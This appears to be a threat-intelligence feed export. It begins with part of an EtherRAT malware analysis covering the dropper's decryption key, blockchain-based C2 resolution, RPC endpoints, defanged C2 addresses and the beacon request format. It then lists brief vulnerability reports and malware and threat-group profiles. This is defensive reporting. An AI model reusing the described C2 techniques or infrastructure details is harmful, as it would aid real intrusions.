The installer contains two payloads, one is base64 encoded and encrypted and is saved as **$HOME/.local/share/.05bf0e9b/.1d5j6rm2mg2d** ; while the other is base64 encoded and decodes to *Obfuscator.io* encoded JavaScript and is saved as **$HOME/.local/share/.05bf0e9b/.kxnzl4mtez.js** . The installer executes **kxnzl4mtez.js** using the node installation and then deletes itself.

![](data:image/png;base64,)

#### Dropper (kxnzl4mtez.js)

The dropper AES decrypts the EtherRAT payload **1d5j6rm2mg2d**  using the key *0x727eee4732a2320399fdd0f1b9c973803ac628b43b1c4b446752ddea4e9e46c8* and IV *0xda25b1996c78afdf1f856f63229cca5c*. The decrypted EtherRAT is obfuscated with *Obfuscator.io*.

#### EtherRAT

The EtherRAT implant uses a Ethereum contract to resolve its C2 nodes. Contracts are code that run on the Ethereum block chain. This technique, sometimes referred to as "EtherHiding" is used as a persistence technique to avoid C2 take downs.

The analyzed sample uses a contract with the following information:

``` 
Smart Contract Address: 0x22f96d61cf118efabc7c5bf3384734fad2f6ead4
Lookup Parm: 0xE941A9b283006F5163EE6B01c1f23AA5951c4C8D
Function selector: 0x7d434425    

```

Analysis of the contract and related activity revealed the following possible C2 addresses, none of which are active except `hxxp://173.249.8[.]102`, which currently points to a website titled: "Daily Email Marketing Solution - Professional Email Marketing Services". The grabify URL redirects to `hxxp://91.215.85[.]42:3000`.

``` 
hxxp://91.215.85[.]42:3000
hxxps://grabify[.]link/SEFKGU?dry87932wydes/fdsgdsfdsjfkl
hxxps://grabify[.]link/SEFKGU
hxxp://173.249.8[.]102

```

Contract events showing C2 updates via the *setString* method.

![](data:image/png;base64,)

Website - "Daily Email Marketing Solution - Professional Email Marketing Services"  
![](data:image/png;base64,)

#### Decompiled Contract Bytecode

The analyzed contract contained the following bytecode.

![](data:image/png;base64,)

The decompiled bytecode is presented below. Note the function selector value *0x7d434425* is present in the code.  
![](data:image/png;base64,)

#### Ethereum RPC Endpoints

EtherRAT contacts nine RPC endpoints to interact with the contract such that information can be retrieved, smart contract functions can be executed and signed transactions can be submitted.

![](data:image/png;base64,)

**RPC EndPoints**

``` 
https://eth.llamarpc.com
https://mainnet.gateway.tenderly.co
https://rpc.flashbots.net/fast
https://rpc.mevblocker.io
https://eth-mainnet.public.blastapi.io
https://ethereum-rpc.publicnode.com
https://rpc.payload.de
https://eth.drpc.org
https://eth.merkle.io

```

#### Commands

To execute commands, EtherRAT generates a URL with the following pattern

``` 
<c2>/api/<random>/<bot_id>/<random>.<ext>?<param>=<build_id>

ex: http://localhost:3000/api/07ebf839/ac6b84b2-05e6-4fca-928d-8d3f1837d743/9087d2a7.jpg?b=c6d83cb1-a4de-443d-bd78-da925acc5f8d

```

The *param* can one of **'id', 'token', 'key', 'b', 'q', 's', 'v'** and the *ext* can be one of **'png', 'jpg', 'gif', 'css', 'ico', 'webp'** .

The HTTP request is similar to the following.

``` 
GET /api/e86c3434/ac6b84b2-05e6-4fca-928d-8d3f1837d743/27567a88.gif?b=c6d83cb1-a4de-443d-bd78-da925acc5f8d HTTP/1.1
host: localhost:3000
connection: keep-alive
X-Bot-Server: http://localhost:3000
accept: */*
accept-language: *
sec-fetch-mode: cors
user-agent: node
accept-encoding: gzip, deflate

```

EtherRAT is capable of providing the following capabilities:

  - Executing arbitrary Node.js code
  - Executing arbitrary commands
  - Retrieving C2 URLs via the Ethereum smart contract
  - Self-update

EtherRAT is delivered by exploiting the React2Shell remote code execution (RCE) vulnerability described in CVE-2025-55182. Multiple payloads have been deployed via this vulnerability, however, EtherRAT is the focus of this report.EtherRAT employs multiple persistence mechanisms, can self-update, executes arbitrary Node.js code and commands. Unlike other payloads delivered through the React2Shell vulnerability, it does not target cryptocurrency wallets or steal credentials; its primary objective is to achieve long-term persistence.

objects.name: Vulnerability Report for Out of bounds write in Skia in Google Chrome prior to 146.0.7680.75
objects.description: Out of bounds write in Skia in Google Chrome prior to 146.0.7680.75 allowed a remote attacker to perform out of bounds memory access via a crafted HTML page.

objects.name: ITG23 Threat Group Profile
objects.x_com_ibm_short_description: ITG23 refers to a Russia-based cybercriminal network which emerged in 2016 and is also known as Wizard Spider or simply just the "Trickbot Group" or "Conti Group”. Historically, this network is best thought of as a group of groups—not unlike a large, decentralized corporation—who reported to common “upper management” and shared infrastructure and support functions. Since 2022, ITG23 has experienced many organizational changes, splintering into several factions and forging new relationships with other threat actors. Some sources suggest that former members of the network may still be active under other ransomware groups.

objects.name: Vulnerability Report for Unhead has a XSS bypass in `useHeadSafe` via attribute name injection and case-sensitive protocol check
objects.description: Unhead is a document head and template manager. Prior to 2.1.11, useHeadSafe() can be bypassed to inject arbitrary HTML attributes, including event handlers, into SSR-rendered <head> tags. This is the composable that Nuxt docs recommend for safely handling user-generated content. The acceptDataAttrs function (safe.ts, line 16-20) allows any property key starting with data- through to the final HTML. It only checks the prefix, not whether the key contains spaces or other characters that break HTML attribute parsing.

objects.name: Vulnerability Report for Google Chrome on Android security bypass
objects.description: Google Chrome on Android could allow a remote attacker to bypass security restrictions, caused by incorrect security UI in LookalikeChecks. By persuading a victim to visit a specially crafted Web site, an attacker could exploit this vulnerability to bypass security restrictions.
objects.x_xfe_remedy: Upgrade to the latest version of Google Chrome (146.0.7680.71 or 146.0.7680.72 or later), available from the Google Chrome Releases Web site. See References.

objects.name: Hopmon Analysis Report (XF0001583)
objects.x_com_ibm_short_description:
Hopmon is a surveillance tool designed to monitor Windows devices. Once installed, it can gather system and network information, and maintain persistent access to the device. The tool is designed with a modular "Client-Engine" structure, allowing operators to manage endpoints as part of a long-term surveillance operation.

Hopmon includes capabilities for audio and video surveillance, such as activating microphones and cameras to record activity. It also contains functionality related to communication features, including voice and video calls. Communication with its command server requires a valid Host Master Key (HMK) which ensures controlled access to the infrastructure.

The application's user interface (UI) supports both English and Korean (ko - ISO 639-1) languages.

Hopmon contains the following capabilities:

*   Interactive media features (live video, audio, camera access, and recording capabilities).
*   Installs Npcap drivers to enable network packet sniffing.
*   Executes powershell commands to add its installation path to Windows Defender exclusions.
*   Modifies its timestamp to blend into system directories.
*   Attempts privilege escalation via UAC manipulation.
*   Disguises its background daemon as a legitimate Windows service.
*   Terminates previous versions of itself during deployment.
*   Drops .lnk shortcut files in the Startup folder and adds Registry "Run" keys for persistence.

objects.name: Vulnerability Report for Inappropriate implementation in V8 in Google Chrome prior to 146.0.7680.75
objects.description: Inappropriate implementation in V8 in Google Chrome prior to 146.0.7680.75 allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.

objects.name: Vulnerability Report for Centrifugo: SSRF via unverified JWT claims interpolated into dynamic JWKS endpoint URL
objects.description: Centrifugo is an open-source scalable real-time messaging server. Prior to 6.7.0, Centrifugo is vulnerable to Server-Side Request Forgery (SSRF) when configured with a dynamic JWKS endpoint URL using template variables (e.g. {{tenant}}). An unauthenticated attacker can craft a JWT with a malicious iss or aud claim value that gets interpolated into the JWKS fetch URL before the token signature is verified, causing Centrifugo to make an outbound HTTP request to an attacker-controlled destination.

objects.name: Handala Wiper Attack Disrupts Global Medical Manufacturer
objects.x_com_ibm_short_description: X-Force is monitoring a destructive cyberattack against Stryker Corporation, a global medical technology manufacturer, [claimed by the Handala Hack Team](https://krebsonsecurity.com/2026/03/iran-backed-hackers-claim-wiper-attack-on-medtech-firm-stryker/), a hacktivist group [reportedly](https://blog.checkpoint.com/research/what-defenders-need-to-know-about-irans-cyber-capabilities/) linked to Iran's Ministry of Intelligence and Security (MOIS). On March 11, 2026, Handala claimed in a statement posted to Telegram they had executed a data-wiping operation that disabled over 200,000 systems, servers, and mobile devices across Stryker's 79-country operations, forcing the shutdown of manufacturing facilities and with [thousands of employees](https://www.irishexaminer.com/news/munster/arid-41808308.html) impacted at the company's Cork, Ireland headquarters. KrebsOnSecurity [reported](https://krebsonsecurity.com/2026/03/iran-backed-hackers-claim-wiper-attack-on-medtech-firm-stryker/) that a trusted source indicated the attack leveraged Microsoft Intune's remote wipe functionality to systematically erase data across Stryker's Windows environment without deploying traditional ransomware or malware. This incident represents a significant escalation in Handala's targeting of Western healthcare supply chains and demonstrates the group's capability to cause immediate operational and financial impact—[Stryker's shares reportedly fell](https://www.reuters.com/technology/stryker-shares-fall-after-report-suspected-iran-linked-cyberattack-2026-03-11/) approximately 3.4% in a single trading day. Per the group's Telegram post, the attack was a retaliation for an attack on an Iranian school, marking a shift from Handala's primarily Israel-focused targeting to include Western medical manufacturers.

objects.name: Vulnerability Report for DataEase SQL Injection Vulnerability
objects.description: Dataease is an open source data visualization analysis tool. Prior to 2.10.20, The table parameter for /de2api/datasource/previewData is directly concatenated into the SQL statement without any filtering or parameterization. Since tableName is a user-controllable string, attackers can inject malicious SQL statements by constructing malicious table names.

objects.name: LATAM Baited into the Delivery of PureHVNC
objects.x_com_ibm_short_description: Between August and October 2025, IBM X-Force observed several emails targeting likely Colombian, Spanish-speaking individuals with themes relating to the Attorney General's office of Colombia. The emails entice the user to download an "official document" from the judicial information system, which starts the infection chain of executing a Hijackloader executable that leads to the PureHVNC [Remote Access Trojan](https://opencti.intsum.ibm.com/dashboard/analyses/reports/d8b54544-b61c-4322-b1dc-8940ca2f4dd8) (RAT).

objects.name: IP Report for IP address 190.123.85.29
objects.description: One of the five RIRs announced a (new) location mapping of the IP.

objects.name: VoidLink Malware Profile
objects.x_com_ibm_short_description:
VoidLink is cloud-native Linux Malware Framework consisting of several components including loaders, implants, rootkits and modular plugins. The framework is capable of detecting and targeting cloud and container environments. VoidLink is designed to provide persistent access to Linux systems and is partly based on Cobalt Strike's Beacon Object Files. To hinder analysis, VoidLink is designed with runtime code encryption, self-deletion, environment-detection and rootkit capabilities.

VoidLink is written in [Zig](https://ziglang.org/), a open-source, general-purpose programming language.

objects.name: Vulnerability Report for Heap buffer overflow vulnerability in LibreDWG
objects.description: Heap buffer overflow vulnerability in LibreDWG versions v0.13.3.7571 up to v0.13.3.7835 allows a crafted DWG file to cause a Denial of Service (DoS) via the function decompress_R2004_section at decode.c.

objects.name: Vulnerability Report for undici is vulnerable to Malicious WebSocket 64-bit length overflows undici parser and crashes the client
objects.description: A server can reply with a WebSocket frame using the 64-bit length form and an extremely large length. undici's ByteParser overflows internal math, ends up in an invalid state, and throws a fatal TypeError that terminates the process.
objects.x_xfe_remedy: Users should upgrade to undici version v7.24.0 and v6.24.0 or later.

objects.name: Vulnerability Report for Path Traversal Leading to Arbitrary File Read, Write and Delete in TinaCMS
objects.description: Prior to 2.1.8, the TinaCMS CLI development server exposes media endpoints that are vulnerable to path traversal, allowing attackers to read and write arbitrary files on the filesystem outside the intended media directory.

objects.name: Vulnerability Report for GL-iNet GL-AR300M16 v4.3.11 Command Injection
objects.description: GL-iNet GL-AR300M16 v4.3.11 was discovered to contain a command injection vulnerability via the set_config function. This vulnerability allows attackers to execute arbitrary commands via a crafted input.

objects.name: Vulnerability Report for Remote Code Execution in Veeam Backup & Replication
objects.description: A vulnerability allowing an authenticated user with the Backup Administrator role to perform remote code execution (RCE) in high availability (HA) deployments of Veeam Backup & Replication.

objects.name: Phorpiex Malware Profile
objects.x_com_ibm_short_description:
Phorpiex, also known as Trik, is a long-standing and adaptable botnet malware. It has evolved from a worm spreading via removable drives and instant messaging to a sophisticated botnet capable of distributing various malware families, including ransomware, cryptocurrency miners, and engaging in large-scale spam and extortion campaigns.

This report contains analysis for the downloader component which is observed in a campaign to deliver [GLOBAL Ransomware](https://opencti.intsum.ibm.com/dashboard/analyses/reports/7e22b0ac-71f9-4144-93d7-6778c25ff3bd).

The campaign, observed in early January 2026, starts with a phishing email containing a ZIP archive named **Document.zip** which contains a malicious Microsoft LNK file named **Document.doc.lnk** . Once the link is clicked, a PowerShell command is executed downloading a Phorpiex downloader from `hxxp://178.16.54[.]109/spl.exe.` The payload is saved as %UserProfile%\windrv.exe and executed.

Of note, the analyzed downloader sample contains the unreferenced strings "freeukraine" and "hxxp://fuckput\[.]in" which is a play on the string "fuck putin".

objects.name: Vulnerability Report for OneUptime: Stored XSS via Mermaid Diagram Rendering (securityLevel: "loose")
objects.description: OneUptime is a solution for monitoring and managing online services. Prior to 10.0.23, the Markdown viewer component renders Mermaid diagrams with securityLevel: "loose" and injects the SVG output via innerHTML. This configuration explicitly allows interactive event bindings in Mermaid diagrams, enabling XSS through Mermaid's click directive which can execute arbitrary JavaScript. Any field that renders markdown (incident descriptions, status page announcements, monitor notes) is vulnerable.

objects.name: Vulnerability Report for Tenda i12 WifiMacFilterGet formWifiMacFilterGet stack-based overflow
objects.description: A weakness has been identified in Tenda i12 1.0.0.6(2204). The affected element is the function formWifiMacFilterGet of the file /goform/WifiMacFilterGet. This manipulation of the argument index causes stack-based buffer overflow. The attack may be initiated remotely.

objects.name: Vulnerability Report for Google Chrome on iOS security bypass
objects.description: Google Chrome on iOS could allow a remote attacker to bypass security restrictions, caused by unsafe navigation in Navigation. By persuading a victim to visit a specially crafted Web site, an attacker could exploit this vulnerability to bypass security restrictions.
objects.x_xfe_remedy: Upgrade to the latest version of Google Chrome (146.0.7680.71 or 146.0.7680.72 or later), available from the Google Chrome Releases Web site. See References.

objects.name: Vulnerability Report for Path Traversal in Media Upload Handle in Tina
objects.description: A path traversal vulnerability exists in the TinaCMS development server's media upload handler prior to 2.1.7. The code at media.ts joins user-controlled path segments using path.join() without validating that the resulting path stays within the intended media directory. This allows writing files to arbitrary locations on the filesystem.
objects.x_xfe_remedy: This vulnerability is fixed in 2.1.7.

objects.name: Vulnerability Report for Parse Server: Account takeover via operator injection in authentication data identifier
objects.description: An unauthenticated attacker can take over any user account that was created with an authentication provider that does not validate the format of the user identifier (e.g. anonymous authentication). By sending a crafted login request, the attacker can cause the server to perform a pattern-matching query instead of an exact-match lookup, allowing the attacker to match an existing user and obtain a valid session token for that user's account.

objects.name: Interlock Ransomware Malware Profile
objects.x_com_ibm_short_description:
The Interlock ransomware group conducts big-game ransomware operations that employs versions of the Interlock ransomware to encrypt files on Windows and Linux systems. Interlock operations consist of a multi-stage attack chain to gain an initial foothold using a variety of techniques that have evolved since starting operations in September 2024. Techniques employed to deliver Remote Access Trojans (RAT) in order to exfiltrate data and deploy the Interlock ransomware include fake browser updates, PowerShell, and newer techniques such as ClickFix; a social engineering tactic to get a target to copy and paste malicious commands and execute them. Interlock exfiltrates data to Azure Storage then deploys the Interlock ransomware.

The Interlock ransomware is used by the Interlock group to encrypt files on Windows and Linux systems using a combination of AES and RSA cryptographic algorithms. The two versions of the Interlock ransomware function similarly and use the LibTomCrypt library to perform cryptographic operations. The Windows version of the Interlock ransomware is typically packed using the JunkFiction Loader which has been used to pack other malware associated with the Interlock group since it was first observed being used around May 2024.

objects.name: Manufacturing Industry Profile
objects.x_com_ibm_short_description:
The manufacturing industry continues to be the most targeted sector by cybercriminals, experiencing 26% of all attacks among the top 10 industries in 2024, according to the [2025 IBM X-Force Threat Intelligence Index](https://www.ibm.com/reports/threat-intelligence). Manufacturing organizations are frequently targeted due to their reliance on complex supply chains, operational technology (OT), and critical infrastructure, making them prime candidates for ransomware, data theft, and extortion-based attacks.

IBM X-Force assesses with medium confidence that ransomware, data exfiltration, and malware-based attacks will remain primary threats to manufacturing organizations over the next year. The sector remains vulnerable due to aging IT systems, security misconfigurations, and the need for uninterrupted production. Additionally, supply chain attacks pose a growing risk, as adversaries seek to disrupt operations and compromise third-party vendors to gain access to critical systems.

Cyber incidents in manufacturing are not just frequent—they are also costly. According to the [IBM-sponsored Cost of a Data Breach study by the Ponemon Institute for 2024](https://www.ibm.com/reports/data-breach), the industrial sector—which encompasses manufacturing—experienced an average data breach cost of $5.56 million, slightly above the global average of $4.88 million. Production downtime, supply chain disruptions, and regulatory costs are key drivers of these high expenses. As cybercriminals evolve their tactics, identity-based attacks, supply chain compromises, and OT system intrusions will likely continue to threaten the manufacturing sector. Organizations must prioritize asset visibility, patch management, access controls, and proactive threat detection to mitigate these risks.

objects.name: Vulnerability Report for Statmatic: privilege escalation via stored cross-site scripting
objects.description: Statmatic is a Laravel and Git powered content management system (CMS). Prior to 6.6.2, stored XSS in the control panel color mode preference allows authenticated users with control panel access to inject malicious JavaScript that executes when a higher-privileged user impersonates their account.

objects.name: IP Report for IP address 175.43.88.83
objects.description: One of the five RIRs announced a (new) location mapping of the IP.

objects.name: Vulnerability Report for Cap'n Proto: Integer overflow in KJ-HTTP chunk size
objects.description: Cap'n Proto is a data interchange format and capability-based RPC system. Prior to 1.4.0, when using Transfer-Encoding: chunked, if a chunk's size parsed to a value of 2^64 or larger, it would be truncated to a 64-bit integer. In theory, this bug could enable HTTP request/response smuggling.

objects.name: TookPS Malware Profile
objects.x_com_ibm_short_description:
TookPS is a multi-stage downloader targeting Microsoft Windows systems. It utilizes the legitimate **Inno Setup** installer framework to deliver malicious payloads, perform system reconnaissance, and facilitate remote access via SSH tunneling and the TeviRat backdoor.

TookPS typically masquerades as installers for popular software (e.g., Adobe Premiere Pro, DeepSeek, GIMP) to deceive users.

*   An Inno Setup installer executes, dropping several benign files to disk to appear legitimate.
*   The core malicious functionality is contained within a compiled Pascal binary that runs in memory during the installation process but is never written to disk, complicating forensic analysis.
*   To distract the victim, the malware executes a legitimate decoy installer contained in an encrypted 7zip archive while the malicious commands are processed in the background.
*   Downloaded PowerShell commands are used to download additional files including an SSH executable, configuration file, and certificate used to create a reverse shell, and the TeviRat backdoor.

objects.name: Hive0162 Threat Group Profile
objects.x_com_ibm_short_description: Hive0162 is a likely financially motivated threat cluster operating within the Latin American region, with a strong focus on Spanish‑speaking users in Colombia. Since mid-2025, IBM X-Force has tracked multiple, separate campaigns —including the delivery of PureHVNC, DCRat, and the newly identified Threadveil loader—and has now correlated this activity to a single, cohesive threat group based on highly overlapping infrastructure, phishing themes, malware delivery methods, and technical tradecraft.

objects.name: Hive0129 Threat Group Profile
objects.description:
# Summary

IBM X-Force Threat Intelligence tracks a financially-motivated threat group we identify as Hive0129, believed to originate from South America. Hive0129 has likely been active since 2019 delivering commodity malwares such as [Proyecto RAT, BitRAT](https://www.trendmicro.com/en_us/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html), [QuasarRAT](https://opencti.intsum.ibm.com/dashboard/analyses/reports/8f1f51fe-4757-462a-bd6f-ad7c25049a8d:73d65a7f17c847eb9e4e48b30d7190fd). In January 2023, X-Force observed a shift in which Hive0129 started conducting spear phishing campaigns to deliver a custom banking trojan we named BlotchyQuasar. Phishing campaigns largely target users in Latin America and contain malicious attachments and/or links with senders purporting to originate from Colombian government agencies. Emails are generally directed towards Colombian government and private entities, likely for financial data, business intelligence, and intellectual property information; however, X-Force has observed emails sent to entities in Spain, as well as other Latin American-based institutions located in Bolivia, Ecuador, and Chile.

Hive0129 has not altered their tactics, techniques, and procedures (TTPs), possibly signifying operating procedures that are effective, or the group lacks knowledge, effort, and/or resources to advance their tactics and operations. In addition, compared to other cyber criminal groups operating in the same space, Hive0129 campaigns are rather small that they may just slide under the radar. Since tracking Hive0129,  X-Force has made note of some defining infrastructure characteristics to make note of. Hive0129 creates their C2 domains using IPs provided by the Internet Service Provider Paradise Networks LLC (Autonomous System Label PARAD-40-ASN). The IP ranges used by Hive0129 are 69.167.8.0/22 (US IPs), and 128.90.108.0/23 (CO IPs). In addition, Hive0129 uses dynamic infrastructure including subdomains for linkpc\[.\]net, ddns\[.\]net, line\[.\]pm, publicvm\[.\]com, and work\[.\]gd. The subdomains for publicvm\[.\]com will consist of the word perfect, followed by a number ie. perfect5\[.\]publicvm\[.\]com. 

The BlotchyQuasar banking trojan is developed on top of the QuasarRAT [codebase](https://github.com/quasar/Quasar), likely by Hive0129, and supports a wide range of different, custom commands. Some of the most interesting features include the installation of root certificates and proxy auto-config URLs, which may be used in conjunction with Google Chrome Kiosk mode to impersonate financial institutions. BlotchyQuasar has various commands to install specific 3rd party tools such as PuTTY, RDP, Chrome/Opera Portable, AnyDesk, TightVNC, hidden-VNC, NGINX server, Node.js server, Remote Utilities, WinPwnage, and credential stealers. BlotchyQuasar's most important feature is the detection of specific online banking applications and reporting those to a C2 server. The malware does not wait for C2 commands, but starts directly after initialization and runs in 5 second intervals. The trojan begins by grabbing the title of whichever window is currently in the foreground. This string is then compared against a series of hardcoded titles of common banking applications used in Colombia, and added to the victim information shown on the C2 panel.

# Associated Malware Families

[Proyecto RAT, BitRAT](https://www.trendmicro.com/en_us/research/21/i/apt-c-36-updates-its-long-term-spam-campaign-against-south-ameri.html), [QuasarRAT](https://exchange.xforce.ibmcloud.com/malware-analysis/guid:73d65a7f17c847eb9e4e48b30d7190fd), [BlotchyQuasar](https://exchange.xforce.ibmcloud.com/malware-analysis/guid:9dedf154be0549a080952d741dd06ee0)

# Notable Campaigns and X-Force Insights

| Activity | Date |
| --- | --- |
| X-Force observed a phishing campaign impersonating the Judicial Branch of Colombia (Rama Judicial de Colombia -RAMA) and Colombia's immigration authority - Migración Colombia. | Sept 2025 |
| X-Force observed Hive0129 imitating the Judicial Branch of Colombia. | Oct 2024 |
| Zscaler ThreatLabz reported activity from BlindEagle targeting the Colombian Insurance Sector with BlotchyQuasar. | June 2024 |
| X-Force observed a Hive0129 phishing campaign impersonating Colombia's Directorate of National Taxes and Customs (DIAN). | May 2024 |
| X-Force tracked phishing campaigns conducted by Hive0129 that impersonate Colombia's Ministry of Transportation to deliver the group's BlotchyQuasar banking trojan. | Oct 2023 |
| X-Force observed Hive0129 targeting financial institutions in LATAM with BlotchyQuasar. | July 2023 |
| X-Force observed multiple email campaigns imitating Migración Colombia (Colombia's immigration authority) as well as Rama Judicial de Colombia (Colombia's Judiciary) and leveraging a custom banking trojan called BlotchyQuasar.. | Jan 2023 |

objects.name: Vulnerability Report for Locutus: RCE via unsanitized input in create_function()
objects.description: Locutus brings stdlibs of other programming languages to JavaScript for educational purposes. Prior to 3.0.14, the create_function(args, code) function passes both parameters directly to the Function constructor without any sanitization, allowing arbitrary code execution. This is distinct from CVE-2026-29091 which was call_user_func_array using eval() in v2.x. This finding affects create_function using new Function() in v3.x. This vulnerability is fixed in 3.0.14.

objects.name: Vulnerability Report for Arbitrary File Read via Disabled Vite Filesystem Restriction in TinaCMS CLI
objects.description: Prior to 2.1.8, the TinaCMS CLI dev server configures Vite with server.fs.strict: false, which disables Vite's built-in filesystem access restriction. This allows any unauthenticated attacker who can reach the dev server to read arbitrary files on the host system.
objects.x_xfe_remedy: This vulnerability is fixed in 2.1.8.

objects.description: A vulnerability allowing an authenticated domain user to perform remote code execution (RCE) on the Backup Server.

objects.name: New Year, More Phorpiex
objects.x_com_ibm_short_description: In early January 2026, IBM X-Force detected a large scale Phorpiex botnet (aka Trik) campaign targeting victims worldwide. X-Force assesses with high confidence a Phorpiex botnet is distributing a widespread campaign of Aware Ransomware, a variant of "[GLOBAL Ransomware](https://opencti.intsum.ibm.com/dashboard/analyses/reports/7e22b0ac-71f9-4144-93d7-6778c25ff3bd)" via phishing emails, with the highest volumes detected between January 4-7, 2026. The campaign exhibits characteristics of opportunistic targeting, aiming for broad impact across various sectors. The Phorpiex botnet has a long history of distributing diverse malware and leveraging automated tactics for ransomware deployment. The campaign's attack chain initiates with a phishing email titled "Your Document" from jenny\[@]gsd\[.]com, containing a ZIP attachment named "Document.zip". This ZIP file contains LNK files that, upon execution, download the Phorpiex Bot Downloader. The downloader subsequently deploys the Aware Ransomware. X-Force detected over 35,000 attempted deliveries of the malicious email, underscoring the indiscriminate nature of the targeting. Notably, [in mid-2025](https://www.cybereason.com/blog/threat-analysis-phorpiex-downloader), the Phorpiex botnet was observed delivering Lockbit 3.0 ransomware, indicating adaptability in payload distribution. The deployment of Aware Ransomware poses an immediate threat to businesses. Successful infection will very likely result in significant operational disruption, data encryption, and potential data exfiltration, leading to financial losses, reputational damage, and regulatory penalties. Organizations in all sectors are at risk due to the broad targeting.

objects.name: Vulnerability Report for Inductive Automation Ignition Software Deserialization of Untrusted Data
objects.description: Inductive Automation Ignition Software is vulnerable to an unauthenticated API endpoint exposure that may allow an attacker to remotely change the "forgot password" recovery email address.
objects.x_xfe_remedy: Covered in Ignition Security Hardening Guide Appendix A. Create a new dedicated local Windows account that will be used exclusively for the Ignition service (e.g. svc-ign). The best security practice is that the Ignition service should not be a domain account (unless otherwise needed). Remove all group memberships from the service account (including Users and Administrators). Add to security policy to log in as a service. Add to "Deny log on locally" security policy. Provide full read/write access only to the Ignition installation directory for the service account created in #1. Add read/write permissions to other directories in the local filesystem as needed (e.g.: if configured to use optional Enterprise Administration Module to write automated backups to the file system). Set deny access settings for service account on other directories not needed by the Ignition service. Specifically the C:\Windows, C:\Users, and directories for any other applications in the Program Files or Program Files(x86) directories. Use java param to change temp directory to a location within the Ignition install directory so the Users folder can be denied access to the Ignition service account. Restrict project imports to verified and trusted sources only, ideally using checksums or digital signatures. Use multiple environments (e.g. Dev, Test, Prod) with a staging workflow so that new data is never introduced directly to production environments. See Ignition Deployment Best Practices. When feasible, segment or isolate Ignition gateways from corporate resources and Windows Domains. The Ignition service account or AD server object should never need Windows Domain or Windows Active Directory privileges. This would only be needed if an Asset Owners IT or OT department uses this for management outside Ignition. Ignition may be federated with Active Directory environments (e.g. OT domains) by entering "Authentication Profile" credentials within the Ignition gateway itself. This could use secure LDAP, SAML, or OpenID Connect. When feasible, enforce strong credential management and MFA for all users with Designer permissions (8.1.x and 8.3.x), Config Page permissions (8.1.x), and Config Write permissions (8.3.x). When feasible, deploy Ignition within hardened or containerized environments.

objects.name: Vulnerability Report for Magic Wormhole: "wormhole receive" allows arbitrary local file overwrite
objects.description: Magic Wormhole makes it possible to get arbitrary-sized files and directories from one computer to another. From 0.21.0 to before 0.23.0, receiving a file (wormhole receive) from a malicious party could result in overwriting critical local files, including ~/.ssh/authorized_keys and .bashrc. This could be used to compromise the receiver's computer. Only the sender of the file (the party who runs wormhole send) can mount the attack. Other parties (including the transit/relay servers) are excluded by the wormhole protocol.
objects.x_xfe_remedy: This vulnerability is fixed in 0.23.0.

objects.name: Vulnerability Report for Google Chrome security bypass
objects.description: Google Chrome could allow a remote attacker to bypass security restrictions, caused by insufficient policy enforcement in DevTools. By persuading a victim to visit a specially crafted Web site, an attacker could exploit this vulnerability to bypass security restrictions.
objects.x_xfe_remedy: Upgrade to the latest version of Google Chrome (146.0.7680.71 or 146.0.7680.72 or later), available from the Google Chrome Releases Web site. See References.

objects.name: CISA Issues Emergency Directive to Secure Cisco SD-WAN Systems
objects.x_com_ibm_short_description: The Cybersecurity and Infrastructure Security Agency (CISA) has issued Emergency Directive 26-03 requiring immediate remediation of critical vulnerabilities affecting Cisco Catalyst SD-WAN infrastructure. The directive responds to active exploitation of CVE-2026-20127, a critical authentication bypass vulnerability, in conjunction with previously disclosed privilege escalation vulnerabilities CVE-2022-20775 and CVE-2022-20818. Threat actors are leveraging these vulnerabilities to compromise networks with confirmed limited exploitation in production environments. The vulnerabilities affect Cisco Catalyst SD-WAN Controller (formerly vSmart) and Manager (formerly vManage) systems across multiple deployment models, enabling unauthorized administrative access and SD-WAN fabric manipulation.
